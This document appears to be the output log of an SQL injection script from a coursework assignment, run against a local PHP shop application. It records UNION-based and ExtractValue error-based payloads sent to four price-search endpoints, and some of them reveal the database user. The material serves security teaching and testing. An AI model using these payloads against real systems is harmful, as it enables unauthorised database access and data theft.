http://localhost:9000 "GET /search/search_by_price3.php?max=1+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price3.php - With params: {'max': '1 UNION ALL SELECT USER() AS name, USER() AS price -- - '}
Result is:  - 1.00 € <br/> - root@172.17.0.1.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price4.php?max=1+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price4.php - With params: {'max': '1 UNION ALL SELECT USER() AS name, USER() AS price -- - '}
Result is:  - Cherry <br/> - root@172.17.0.1 <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price.php?max=1+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price.php - With params: {'max': '1 UNION ALL SELECT USER() AS name, USER() AS price -- - '}
Result is:  - Cherry   1.00 € <br/> - root@172.17.0.1   root@172.17.0.1.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price2.php?max=1+UNION+ALL+SELECT+USER%28%29+AS+name%2C+USER%28%29+AS+price+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price2.php - With params: {'max': '1 UNION ALL SELECT USER() AS name, USER() AS price -- - '}
Result is:  - Cherry   1.00 € <br/> - root@172.17.0.1   root@172.17.0.1.00 € <br/>

Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price3.php?max=%27+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price3.php - With params: {'max': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php:20
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php(20): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php</b> on line <b>20</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price4.php?max=%27+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price4.php - With params: {'max': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price.php?max=%27+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price.php - With params: {'max': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price2.php?max=%27+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price2.php - With params: {'max': "' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - "}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price3.php?max=%22+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price3.php - With params: {'max': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot; AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php:20
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php(20): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php</b> on line <b>20</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price4.php?max=%22+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price4.php - With params: {'max': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot; AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price.php?max=%22+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price.php - With params: {'max': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot; AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price2.php?max=%22+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price2.php - With params: {'max': '" AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\&quot; AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -' at line 1 in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price3.php?max=1+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price3.php - With params: {'max': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '\root@172.17.0.1' in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php:20
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php(20): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price3.php</b> on line <b>20</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price4.php?max=1+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price4.php - With params: {'max': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '\root@172.17.0.1' in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price4.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price.php?max=1+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price.php - With params: {'max': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '\root@172.17.0.1' in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price.php</b> on line <b>14</b><br />


Starting new HTTP connection (1): localhost:9000
http://localhost:9000 "GET /search/search_by_price2.php?max=1+AND+ExtractValue%280%2C+CONCAT%28+0x5c%2C+USER%28%29+%29+%29+--+-+ HTTP/1.1" 200 None
Sending request to: http://localhost:9000/search/search_by_price2.php - With params: {'max': '1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - '}
Result is: <br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '\root@172.17.0.1' in /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php:14
Stack trace:
#0 /home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php(14): mysqli-&gt;query()
#1 {main}
  thrown in <b>/home/lax/Desktop/Second Assignment - SQL Injections/Application/search/search_by_price2.php</b> on line <b>14</b><br />


